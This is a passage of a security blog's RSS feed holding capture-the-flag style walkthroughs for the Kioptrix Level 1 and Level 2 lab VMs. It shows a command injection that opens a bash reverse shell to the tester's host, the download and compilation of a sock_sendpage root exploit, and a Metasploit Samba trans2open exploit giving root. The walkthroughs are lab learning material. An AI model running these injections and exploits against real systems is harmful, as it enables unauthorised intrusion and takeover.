&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ping google.com&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/192.168.221.139/443 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.139] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.157] 32770
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
bash-3.00&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
bash-3.00&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local privilege Escalation&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.00&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ar&lt;/span&gt;
Linux kioptrix.level2 2.6.9-55.EL &lt;span class=&quot;c&quot;&gt;#1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux&lt;/span&gt;
bash-3.00&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
bash-3.00&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.exploit-db.com/download/9545 &lt;span class=&quot;nt&quot;&gt;--no-check-certificate&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--02&lt;/span&gt;:27:58--  https://www.exploit-db.com/download/9545
           &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;9545&lt;span class=&quot;s1&quot;&gt;'
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
WARNING: certificate common name `*.mycloudproxy.com'&lt;/span&gt; doesn&lt;span class=&quot;s1&quot;&gt;'t match requested host name `www.exploit-db.com'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
HTTP request sent, awaiting response... 200 OK
Length: unspecified &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/txt]

    0K .........                                                30.10 MB/s

02:27:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;30.10 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;9545&lt;span class=&quot;s1&quot;&gt;' saved [9785]

bash-3.00$ mv 9545 sock_sendpage.c                             
bash-3.00$ gcc -o sock_sendpage sock_sendpage.c
bash-3.00$ ./sock_sendpage
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Kioptrix Level 1 Walkthrough</title>
          <link>https://highon.coffee/blog/kioptrix-level-1-walkthrough/</link>
          <pubDate>Thu, 19 Dec 2013 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Kioptrix</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/kioptrix-level-1-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#samba-enumeration&quot; id=&quot;markdown-toc-samba-enumeration&quot;&gt;Samba Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#metasploit-exploit&quot; id=&quot;markdown-toc-metasploit-exploit&quot;&gt;Metasploit Exploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;

&lt;h2 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 2.9p2 (protocol 1.99)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 1.3.20 ((Unix)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 111&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;RPC Bind&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 139&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;netbios-ssn&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 443&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTPS&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 1.3.20 ((Unix)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;samba-enumeration&quot;&gt;Samba Enumeration&lt;/h2&gt;

&lt;p&gt;Based on the age of the system other services, I know from exeperience that SAMBA is likely vulnerable to the trans2open exploit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;use exploit/linux/samba/trans2open

msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;trans2open&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/linux/samba/trans2open&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   RHOST  192.168.221.156  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address
   RPORT  139              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;generic/shell_reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   LHOST  192.168.221.139  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address
   LPORT  4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Samba 2.2.x - Bruteforce&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;metasploit-exploit&quot;&gt;Metasploit Exploit&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;trans2open&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2015.12.20-21:05:39] Started reverse handler on 192.168.221.139:4444
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2015.12.20-21:05:40] Trying &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;address 0xbffffdfc...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2015.12.20-21:05:41] Trying &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;address 0xbffffcfc...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2015.12.20-21:05:42] Trying &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;address 0xbffffbfc...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2015.12.20-21:05:43] Trying &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;address 0xbffffafc...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.221.139:4444 -&amp;gt; 192.168.221.156:1025&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2015-12-20 21:05:44 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;


^Z
Background session 1? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]  N

&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;hostname
&lt;/span&gt;kioptrix.level1
^Z
Background session 1? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]  y&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;p&gt;Root Flag&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-2.05# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/spool/mail
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/spool/mail
sh-2.05# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;harold
john
nfsnobody
root
sh-2.05# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root   
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root
From root  Sat Sep 26 11:42:10 2009
Return-Path: &amp;lt;root@kioptix.level1&amp;gt;
Received: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;from root@localhost&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    by kioptix.level1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.11.6/8.11.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;n8QFgAZ01831
    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;root@kioptix.level1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Sat, 26 Sep 2009 11:42:10 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;
Date: Sat, 26 Sep 2009 11:42:10 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;
From: root &amp;lt;root@kioptix.level1&amp;gt;
Message-Id: &amp;lt;200909261542.n8QFgAZ01831@kioptix.level1&amp;gt;
To: root@kioptix.level1
Subject: About Level 2
Status: O

If you are reading this, you got root. Congratulations.
Level 2 won&lt;span class=&quot;s1&quot;&gt;'t be as easy...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        </item>
        
      
    
  </channel>
</rss>
